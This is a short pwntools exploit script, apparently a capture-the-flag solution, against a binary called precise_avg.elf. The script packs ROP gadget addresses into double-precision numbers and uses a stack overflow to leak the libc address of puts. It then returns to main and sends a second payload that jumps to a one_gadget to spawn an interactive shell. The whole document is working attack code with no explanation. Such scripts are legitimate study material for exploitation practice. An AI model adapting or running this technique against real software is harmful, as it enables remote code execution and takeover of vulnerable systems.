from pwn import *
from struct import unpack

libc = ELF('./libc.so.6')

def to_double(data):
	return "%.800f " % unpack("<d", p64(data))

r = process('./precise_avg.elf')

pop_rdi = 0x4009c3
puts_got = 0x600fb0
puts_plt = 0x400630
bss = 0x601800
main = 0x4007d0

n = 39
r.sendlineafter(':', str(n))
payload = '1 '*33 + '- ' + to_double(bss)
payload += to_double(pop_rdi) + to_double(puts_got) + to_double(puts_plt) + to_double(main)
r.sendline(payload)

libc_base = u64(r.recvuntil('\x7f')[-6:]+'\x00'*2) - libc.symbols['puts']
one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]
one_shot = libc_base + one_gadget[0]

n = 36
r.sendline(str(n))
payload = '1 '*33 + '- ' + to_double(bss) + to_double(one_shot)
r.sendline(payload)

r.interactive()